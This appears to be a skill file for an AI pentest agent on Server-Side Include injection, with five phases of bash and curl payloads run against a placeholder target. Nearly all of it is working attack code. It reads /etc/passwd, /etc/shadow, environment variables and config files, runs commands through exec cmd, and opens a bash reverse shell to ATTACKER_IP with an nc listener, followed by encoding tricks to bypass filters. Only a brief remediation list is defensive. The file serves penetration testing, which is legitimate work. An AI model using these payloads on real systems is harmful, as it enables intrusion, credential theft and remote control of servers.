---
name: payload-ssi-injection
description: "Server-Side Include (SSI) injection payloads. Command execution via exec cmd, file inclusion, environment variable disclosure, printenv. Triggers: 'ssi injection', 'server side include', 'shtml injection', 'ssi payloads', 'ssi rce', 'ssi exec', 'include virtual', 'shtml rce'."
---

# SSI Injection

SSI directives interpreted by web server → information disclosure, file inclusion, RCE.

**Affected:** Apache with mod_include, Nginx with ngx_http_ssi_module, IIS with SSI enabled.
**Vulnerable extensions:** `.shtml`, `.shtm`, `.stm`, `.stml`

---

## Phase 1: Detection

```bash
TARGET="https://TARGET"

# Check if SSI is enabled — inject date echo:
PAYLOADS=(
  '<!--#echo var="DATE_LOCAL"-->'
  '<!--#printenv-->'
  '<!--#echo var="DOCUMENT_URI"-->'
  '<!--#echo var="SERVER_SOFTWARE"-->'
)

for payload in "${PAYLOADS[@]}"; do
  echo "=== Testing: $payload ==="
  response=$(curl -s -X POST "$TARGET/comment" \
    -d "content=$payload")
  echo "$response" | grep -iE "[0-9]{4}|apache|nginx|GMT|UTC"
done

# SSI via file extension (if upload allowed):
# Upload file as .shtml → SSI directives execute
curl -s -X POST "$TARGET/upload" \
  -F "file=@test.shtml;type=text/html" \
  --form 'content=<!--#exec cmd="id"-->'
```

---

## Phase 2: Information Disclosure

```bash
# Environment variables (may contain secrets):
DISCLOSURE_PAYLOADS=(
  '<!--#printenv-->'
  '<!--#echo var="DATE_LOCAL"-->'
  '<!--#echo var="DOCUMENT_URI"-->'
  '<!--#echo var="LAST_MODIFIED"-->'
  '<!--#echo var="SERVER_NAME"-->'
  '<!--#echo var="SERVER_SOFTWARE"-->'
  '<!--#echo var="DOCUMENT_ROOT"-->'
  '<!--#echo var="HTTP_USER_AGENT"-->'
  '<!--#echo var="REMOTE_ADDR"-->'
)

# Inject into user-controlled fields:
for payload in "${DISCLOSURE_PAYLOADS[@]}"; do
  curl -s "$TARGET/page?param=$payload" | grep -E "server|root|date|addr"
done
```

---

## Phase 3: File Inclusion

```bash
TARGET="https://TARGET"

# Include local files:
FILE_INCLUSION_PAYLOADS=(
  '<!--#include virtual="/etc/passwd"-->'
  '<!--#include file="/etc/passwd"-->'
  '<!--#include virtual="../../etc/passwd"-->'
  '<!--#include virtual="/proc/self/environ"-->'
  '<!--#include virtual="../../../../etc/shadow"-->'
  '<!--#include virtual="/var/www/html/config.php"-->'
  '<!--#include virtual="/.htpasswd"-->'
)

for payload in "${FILE_INCLUSION_PAYLOADS[@]}"; do
  echo "=== $payload ==="
  result=$(curl -s "$TARGET/feedback" -d "message=$payload")
  echo "$result" | grep -E "root:|daemon:|nobody:|shadow:" | head -5
done
```

---

## Phase 4: Remote Code Execution

```bash
TARGET="https://TARGET"
ATTACKER_IP="YOUR_IP"
LPORT=4444

# Basic command execution:
CMD_PAYLOADS=(
  '<!--#exec cmd="id"-->'
  '<!--#exec cmd="whoami"-->'
  '<!--#exec cmd="hostname"-->'
  '<!--#exec cmd="cat /etc/passwd"-->'
  '<!--#exec cmd="ls -la /var/www/html"-->'
)

for payload in "${CMD_PAYLOADS[@]}"; do
  echo "=== $payload ==="
  curl -s "$TARGET/ssi" -d "content=$payload" | grep -vE "^$|html|css"
done

# Reverse shell via SSI:
REVSHELL="bash -i >& /dev/tcp/$ATTACKER_IP/$LPORT 0>&1"
PAYLOAD="<!--#exec cmd=\"$REVSHELL\"-->"

# Start listener:
# nc -lvnp $LPORT

# Inject:
curl -s "$TARGET/feedback" \
  -d "message=$PAYLOAD"
```

---

## Phase 5: Bypass Techniques

```bash
# Whitespace variations:
'<!-- #exec cmd="id" -->'
'<!--#exec    cmd="id"-->'
'<!--#EXEC cmd="id"-->'

# URL encoding (if application decodes before passing to SSI):
# <!--  = %3c%21%2d%2d
# #exec = %23exec
# -->   = %2d%2d%3e

curl -s "$TARGET/ssi?data=%3c%21%2d%2d%23exec%20cmd%3d%22id%22%2d%2d%3e"

# Double encoding:
# < = %253c, # = %2523, etc.
```

---

## Remediation Reference

```
1. Disable SSI for directories containing user uploads
2. Do not serve user-controlled content from SSI-enabled paths
3. Use Options -Includes in Apache's .htaccess or httpd.conf
4. Validate and sanitize input — reject <!-- characters in user input
5. Run web server with minimal OS privileges (non-root)
```

---

## Output

Save to `.omop/engagement/vuln/ssi-injection/`:
- `detection.txt` — successful SSI directive output
- `file-inclusion.txt` — local files read
- `rce-proof.txt` — command execution output

## Next Phase

→ `pentest-exploit` for full shell exploitation
→ `pentest-report` for final report
